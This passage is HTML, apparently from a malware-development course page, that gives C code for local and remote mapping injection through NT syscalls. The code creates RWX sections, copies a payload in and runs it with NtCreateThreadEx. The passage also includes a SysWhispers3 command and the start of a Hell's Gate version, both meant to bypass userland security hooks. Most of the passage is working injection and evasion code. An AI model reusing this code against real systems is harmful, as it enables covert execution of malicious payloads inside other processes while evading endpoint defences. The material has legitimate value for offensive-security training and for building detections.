+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">// a structure used to keep the syscalls used
+typedef struct _Syscall {
+
+	fnNtCreateSection       pNtCreateSection;
+	fnNtMapViewOfSection    pNtMapViewOfSection;
+	fnUnmapViewOfSection    pNtUnmapViewOfSection;
+	fnNtClose               pNtClose;
+	fnNtCreateThreadEx      pNtCreateThreadEx;
+
+}Syscall, * PSyscall;
+
+
+
+// function used to populate the input &#x27;St&#x27; structure
+BOOL InitializeSyscallStruct (OUT PSyscall St) {
+
+	HMODULE hNtdll	= GetModuleHandle(L&quot;NTDLL.DLL&quot;);
+	if (!hNtdll) {
+		printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	St-&gt;pNtCreateSection         = (fnNtCreateSection)GetProcAddress(hNtdll, &quot;NtCreateSection&quot;);
+	St-&gt;pNtMapViewOfSection      = (fnNtMapViewOfSection)GetProcAddress(hNtdll, &quot;NtMapViewOfSection&quot;);
+	St-&gt;pNtUnmapViewOfSection    = (fnUnmapViewOfSection)GetProcAddress(hNtdll, &quot;NtUnmapViewOfSection&quot;);
+	St-&gt;pNtClose                 = (fnNtClose)GetProcAddress(hNtdll, &quot;NtClose&quot;);
+	St-&gt;pNtCreateThreadEx        = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);
+
+ 	// check if GetProcAddress missed a syscall
+	if (St-&gt;pNtCreateSection == NULL || St-&gt;pNtMapViewOfSection == NULL || St-&gt;pNtUnmapViewOfSection == NULL || St-&gt;pNtClose == NULL || St-&gt;pNtCreateThreadEx == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LocalMappingInjectionViaSyscalls</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RemoteMappingInjectionViaSyscalls</code> functions are responsible for injecting the payload (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pPayload</code>) in the local process and remote process (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">hProcess</code>), respectively. Both functions are shown below.</p><h3 id="localmappinginjectionviasyscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>LocalMappingInjectionViaSyscalls</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+	HANDLE				hSection		= NULL;
+	HANDLE				hThread			= NULL;
+	PVOID				pAddress		= NULL;
+	NTSTATUS			STATUS			= NULL;
+	SIZE_T				sViewSize		= NULL;
+	LARGE_INTEGER		MaximumSize		= {
+			.HighPart = 0,
+			.LowPart = sPayloadSize
+	};
+	Syscall				St			    = { 0 };
+
+	// Initializing the &#x27;St&#x27; structure to fetch the syscall&#x27;s addresses
+	if (!InitializeSyscallStruct(&amp;St)) {
+		printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
+		return FALSE;
+	}
+
+//--------------------------------------------------------------------------
+	// Allocating local map view
+
+	if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
+		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+	// Writing the payload
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+	memcpy(pAddress, pPayload, sPayloadSize);
+	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);
+
+//--------------------------------------------------------------------------
+
+	// Executing the payload via thread creation
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
+	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+//--------------------------------------------------------------------------
+
+	// Unmpaing the local view - only when the payload is done executing
+	if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
+		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	// Closing the section handle
+	if ((STATUS = St.pNtClose(hSection)) != 0) {
+		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="remotemappinginjectionviasyscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>RemoteMappingInjectionViaSyscalls</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+	HANDLE				hSection			= NULL;
+	HANDLE				hThread				= NULL;
+	PVOID				pLocalAddress		= NULL,
+					    pRemoteAddress		= NULL;
+	NTSTATUS			STATUS				= NULL;
+	SIZE_T				sViewSize			= NULL;
+	LARGE_INTEGER		MaximumSize 		= {
+			.HighPart = 0,
+			.LowPart = sPayloadSize
+	};
+	Syscall				St				    = { 0 };
+
+
+	if (!InitializeSyscallStruct(&amp;St)) {
+		printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
+		return FALSE;
+	}
+
+//--------------------------------------------------------------------------
+	// Allocating local map view
+
+	if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
+		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewUnmap, NULL, PAGE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Local Memory Allocated At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+
+	// Writing the payload
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+	memcpy(pLocalAddress, pPayload, sPayloadSize);
+	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);
+
+//--------------------------------------------------------------------------
+
+	// Allocating remote map view
+	if ((STATUS = St.pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] Remote Memory Allocated At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+
+	// Executing the payload via thread creation
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pRemoteAddress);
+	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+//--------------------------------------------------------------------------
+
+	// Unmapping the local view - only when the payload is done executing
+	if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
+		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+
+	// Closing the section handle
+	if ((STATUS = St.pNtClose(hSection)) != 0) {
+		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtUnmapViewOfSection</code> function should only be executed after the payload has finished executing. Attempting to unmap the mapped local view while the payload is still running could break the payload execution or cause a process to crash. As an alternative, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntwaitforsingleobject" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtWaitForSingleObject</a> syscall can be used to wait until the thread is finished, after which the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtUnmapViewOfSection</code> syscall can be performed to clean up the mapped payload, though this is left as an exercise to the reader.</p><h3 id="implementation-using-syswhispers" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Implementation Using SysWhispers</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The implementation here uses SysWhispers3 to bypass userland hooks via direct syscalls. The following command is used to generate the required files for this implementation.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtCreateSection,NtMapViewOfSection,NtUnmapViewOfSection,NtClose,NtCreateThreadEx -o SysWhispers -v*</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Three files are generated: <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SysWhispers.h</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SysWhispers.c</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SysWhispers-asm.x64.asm</code>. The next step is to import these files into Visual Studio as demonstrated in the previous module. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LocalMappingInjectionViaSyscalls</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RemoteMappingInjectionViaSyscalls</code> are shown below.</p><h3 id="localmappinginjectionviasyscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>LocalMappingInjectionViaSyscalls</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+	HANDLE				hSection		= NULL;
+	HANDLE				hThread			= NULL;
+	PVOID				pAddress		= NULL;
+	NTSTATUS			STATUS			= NULL;
+	SIZE_T				sViewSize		= NULL;
+	LARGE_INTEGER		MaximumSize		= {
+			.HighPart = 0,
+			.LowPart = sPayloadSize
+	};
+
+//--------------------------------------------------------------------------
+	// Allocating local map view
+
+	if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
+		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+
+	// Writing the payload
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+	memcpy(pAddress, pPayload, sPayloadSize);
+	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);
+
+//--------------------------------------------------------------------------
+
+	// Executing the payload via thread creation
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
+	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+//--------------------------------------------------------------------------
+
+	// Unmapping the local view - only when the payload is done executing
+	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
+		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	// Closing the section handle
+	if ((STATUS = NtClose(hSection)) != 0) {
+		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="remotemappinginjectionviasyscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>RemoteMappingInjectionViaSyscalls</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+	HANDLE				hSection			= NULL;
+	HANDLE				hThread				= NULL;
+	PVOID				pLocalAddress		= NULL,
+					    pRemoteAddress		= NULL;
+	NTSTATUS			STATUS				= NULL;
+	SIZE_T				sViewSize			= NULL;
+	LARGE_INTEGER		MaximumSize 		= {
+			.HighPart = 0,
+			.LowPart = sPayloadSize
+	};
+
+//--------------------------------------------------------------------------
+	// Allocating local map view
+
+	if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
+		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Local Memory Allocated At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+
+	// Writing the payload
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+	memcpy(pLocalAddress, pPayload, sPayloadSize);
+	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);
+
+//--------------------------------------------------------------------------
+
+	// Allocating remote map view
+	if ((STATUS = NtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Remote Memory Allocated At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+
+	// Executing the payload via thread creation
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pRemoteAddress);
+	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+//--------------------------------------------------------------------------
+
+	// Unmapping the local view - only when the payload is done executing
+	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
+		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	// Closing the section handle
+	if ((STATUS = NtClose(hSection)) != 0) {
+		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="implementation-using-hell-s-gate" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Implementation Using Hell's Gate</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The last implementation for this module is using Hell&#x27;s Gate. First, ensure that the same steps done to set up the Visual Studio project with SysWhispers3 are done here too. Specifically, enabling MASM and modifying the properties to set the ASM file to be compiled using the Microsoft Macro Assembler.</p><h3 id="updating-the-vx-table-structure" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating The VX_TABLE Structure</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _VX_TABLE {
+	VX_TABLE_ENTRY NtCreateSection;
+	VX_TABLE_ENTRY NtMapViewOfSection;
+	VX_TABLE_ENTRY NtUnmapViewOfSection;
+	VX_TABLE_ENTRY NtClose;
+	VX_TABLE_ENTRY NtCreateThreadEx;
+} VX_TABLE, * PVX_TABLE;</code></pre>
